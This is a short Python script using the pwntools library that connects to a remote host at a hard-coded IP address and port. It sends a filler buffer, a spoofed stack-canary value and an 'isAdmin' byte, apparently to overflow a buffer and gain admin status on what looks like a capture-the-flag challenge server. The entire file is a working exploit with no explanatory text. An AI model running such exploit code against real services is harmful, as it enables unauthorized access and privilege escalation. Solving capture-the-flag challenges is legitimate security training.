#!/bin/env python3
import sys
from pwn import *

conn = remote('170.64.222.246', 1339)

buffer = b"AAAABBBBCCCCDDDD"
canary = b"\xEF\xBE\xAD\xDE"
isAdmin = b"1\n"

conn.send(buffer + canary + isAdmin)

print(conn.recvall(3))

conn.close()
# sys.stdout.buffer.write(buffer.encode('utf-8'))
# sys.stdout.buffer.write(buffer)